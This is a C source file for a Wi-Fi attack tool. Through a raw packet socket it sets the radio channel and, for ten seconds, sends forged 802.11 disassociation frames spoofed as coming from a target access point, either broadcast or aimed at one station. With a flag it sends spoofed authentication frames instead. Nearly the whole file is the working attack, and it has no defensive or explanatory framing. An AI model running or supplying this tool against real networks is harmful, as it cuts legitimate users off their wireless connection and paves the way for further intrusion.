#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <unistd.h>
#include <linux/wireless.h>

#include "struct.h"

#define AP_BROADCAST 0
#define AP_UNICAST 1


void usage(char* argv[]){
    printf("Usage: %s <interface> <ap mac> [<station mac> [-auth]] [-c channel]\n", argv[0]);
    printf("Example: %s wlan0 aa:bb:cc:dd:ee:ff\n", argv[0]);
}

void set_channel(const char *interface, int channel) {
    int sock;
    struct iwreq req;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    memset(&req, 0, sizeof(req));
    strncpy(req.ifr_name, interface, IFNAMSIZ);

    req.u.freq.m = channel;
    req.u.freq.e = 0;
    req.u.freq.flags = IW_FREQ_FIXED;

    if (ioctl(sock, SIOCSIWFREQ, &req) < 0) {
        perror("Failed to set channel");
        close(sock);
        exit(EXIT_FAILURE);
    }

    close(sock);

    usleep(200000); // 0.2s
}


int create_socket(const char *interface) {
    int sock;
    struct ifreq ifr;
    struct sockaddr_ll sll;

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        exit(EXIT_FAILURE);
    }

    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);

    if (bind(sock, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        perror("bind");
        close(sock);
        exit(EXIT_FAILURE);
    }

    return sock;
}

void mac_str_to_bytes(const char* mac_str, uint8_t* mac_bytes) {
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_bytes[0], &mac_bytes[1], &mac_bytes[2],
           &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]);
}

void create_disassoc_frame(disassoc_frame *frame, const uint8_t *ap_mac, const uint8_t *station_mac, int mode) {
    frame->radiotap_header.version = 0x00;
    frame->radiotap_header.pad = 0x00;
    frame->radiotap_header.len = 0x08;
    frame->radiotap_header.present = 0x0000000000000000;
    frame->hdr.frame_control = 0x00c0;
    frame->hdr.duration = 0x00;
    if (mode == AP_UNICAST) {
        memcpy(frame->hdr.dest_addr, station_mac, 6);
    } else {
        memset(frame->hdr.dest_addr, 0xff, 6);
    }
    memcpy(frame->hdr.src_addr, ap_mac, 6);
    memcpy(frame->hdr.bssid, ap_mac, 6);
    frame->hdr.seq_ctrl = 0x0000;
    frame->reason_code = 0x0001;
}

void create_auth_frame(auth_frame *frame, const uint8_t *ap_mac, const uint8_t *station_mac, bool auth) {
    frame->radiotap_header.version = 0x00;
    frame->radiotap_header.pad = 0x00;
    frame->radiotap_header.len = 0x08;
    frame->radiotap_header.present = 0x0000000000000000;
    frame->hdr.frame_control = 0xb0;
    frame->hdr.duration = 0x00;
    memcpy(frame->hdr.dest_addr, ap_mac, 6);
    memcpy(frame->hdr.src_addr, station_mac, 6);
    memcpy(frame->hdr.bssid, station_mac, 6);
    frame->hdr.seq_ctrl = 0x0000;
    frame->auth_algorithm = 0x0000;
    frame->auth_seq = auth ? 0x0001 : 0x0002;
    frame->status_code = 0x0000;
}

int main(int argc, char* argv[]){
    if(argc < 3){
        usage(argv);
        return 1;
    }

    char* interface = argv[1];
    uint8_t ap_mac[6];
    uint8_t station_mac[6];
    int mode = AP_BROADCAST;
    bool auth = false;
    int channel = -1;

    mac_str_to_bytes(argv[2], ap_mac);

    for (int i = 3; i < argc; i++) {
        if (strcmp(argv[i], "-auth") == 0) {
            auth = true;
        } else if (strcmp(argv[i], "-c") == 0 && i + 1 < argc) {
            channel = atoi(argv[i + 1]);
            printf("Set channel: %d\n", channel);
            set_channel(interface, channel);
            i++;
        } else {
            mac_str_to_bytes(argv[i], station_mac);
            mode = AP_UNICAST;
        }
    }

    printf("AP MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);

    printf("Station MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5]);
    

    int sock = create_socket(interface);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < 10) {
        if (auth) {
            auth_frame frame;
            create_auth_frame(&frame, ap_mac, station_mac, auth);
            send(sock, &frame, sizeof(frame), 0);
        } else {
            disassoc_frame frame;
            create_disassoc_frame(&frame, ap_mac, station_mac, mode);
            send(sock, &frame, sizeof(frame), 0);
        }
		sleep(0.5);
    }

    close(sock);

    return 0;
}